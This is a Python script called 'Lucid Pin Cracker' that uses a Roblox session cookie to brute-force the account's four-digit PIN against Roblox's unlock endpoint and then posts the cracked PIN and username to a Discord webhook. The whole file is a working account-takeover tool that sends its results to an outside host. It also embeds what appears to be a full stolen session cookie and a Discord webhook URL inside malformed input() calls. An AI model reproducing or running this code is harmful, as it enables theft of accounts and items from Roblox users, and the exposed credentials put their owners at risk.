import requests
import re
import string
import time
import os

pingEveryone = True
print('')
print('Enter your cookie below:')
cookie = input(_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_0014B29AC99D94C9523F46AEF6D5D8646F66F164F29DA8EC6A36E2227D512B8D0FAB8540665E442EFF7229AE049F860F0BDEE62C4AE1D8BCBB129F9609E1135618CA82C8B9D733E9437BDE9628A5A91A9DF31D6F36E5C1CDFFE16DBCDB1A46AF8CEBDD4767729075798719A0A747D35C7EC68520C479123F0E8F583383906BEFA20DE88D10A490AC9590FC8CD3266E728341002E3EF198DF5B56C1F0AAAD7614842733069BB61B06C35E855C6C17D57CF1949811413320E8C666B1B90D7FC510E51BC8B61B8BC6C36528C7746A00B2070318564AFB7A89CF9DC4FD545B526C2687C004CC64F82138B5313A0CBA635BDC0AD1950D10AAA503F55F4ED5A1B1F7D04C37A30EA491DE9017D27C63558806391A1759269FD4644A17532C03D59D543C8073987E6608F8D3C3ABB9310D22BFA330E39786FC8A40FC4C922B3BEA5EA928470BCB3126ED5DEF8EE96C5DDA1D072685E81EAB775FFBDA868EE786F44B5C2DF272E5A30EBCAD02EA62BFC374B37807CAD8D5D1FB4590E491808BBE8F42CE60BD6F0B2C93CD62DFED945037E6AFECCB0FC57433)
os.system("cls")
print('')
print('Enter your webhook below:')
webhook = input(https://discord.com/api/webhooks/1092805902312144906/z1D1c7TCSwMJA93fStHACt0uqOJJmwcTm6hmjUgSOXYq9wbts-rDoKCQGFT_sKxhVmZh)
os.system("cls")
print('')
print('Should we ping Everyone?: ( y / n )')
pingEveryone = input()
os.system("cls")
if pingEveryone.lower == 'y' or pingEveryone == 'yes':
    ping = '@everyone'
else:
    ping = '***Pin Cracked!***'
os.system("cls")

print('''
  ██╗     ██╗   ██╗ █████╗ ██╗██████╗   ██████╗ ██╗███╗  ██╗
  ██║     ██║   ██║██╔══██╗██║██╔══██╗  ██╔══██╗██║████╗ ██║
  ██║     ██║   ██║██║  ╚═╝██║██║  ██║  ██████╔╝██║██╔██╗██║
  ██║     ██║   ██║██║  ██╗██║██║  ██║  ██╔═══╝ ██║██║╚████║
  ███████╗╚██████╔╝╚█████╔╝██║██████╔╝  ██║     ██║██║ ╚███║
  ╚══════╝ ╚═════╝  ╚════╝ ╚═╝╚═════╝   ╚═╝     ╚═╝╚═╝  ╚══╝

   █████╗ ██████╗  █████╗  █████╗ ██╗  ██╗███████╗██████╗ 
  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
  ██║  ╚═╝██████╔╝███████║██║  ╚═╝█████═╝ █████╗  ██████╔╝
  ██║  ██╗██╔══██╗██╔══██║██║  ██╗██╔═██╗ ██╔══╝  ██╔══██╗
  ╚█████╔╝██║  ██║██║  ██║╚█████╔╝██║ ╚██╗███████╗██║  ██║
   ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n\n''')

url = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
xcrsf = (token.headers['x-csrf-token'])
header = {'X-CSRF-TOKEN': xcrsf}

i = 0

for i in range(9999):
    try:
        pin = str(i).zfill(4)
        payload = {'pin': pin}
        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
        if 'unlockedUntil' in r.text:
            print(f'Pin Cracked! Pin: {pin}')
            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
            data = {
                "content" : ping,
                "username" : "Lucid Pin Cracker",
                "avatar_url" : "https://cdn.discordapp.com/attachments/857646271433801748/861595357778804756/lucidicon.png"
            }
            data["embeds"] = [
                {
                    "description" : f"{username}\'s Pin:\n```{pin}```",
                    "title" : "Cracked Pin!",
                    "color" : 0x00ffff,
                }
            ]

            result = requests.post(webhook, json = data)
            input('Press any key to exit')
            break
            
        elif 'Too many requests made' in r.text:
                
            print('  Ratelimited, trying again in 60 seconds..')
            time.sleep(60)
                
        elif 'Authorization' in r.text:
                
            print('  Error! Is the cookie valid?')
            break
            
        elif 'Incorrect' in r.text:
            print(f"  Tried: {pin} , Incorrect!")
            time.sleep(10)  
    except:
        print('  Error!')
    
input('\n  Press any key to exit')
        


        



    
        
            
        



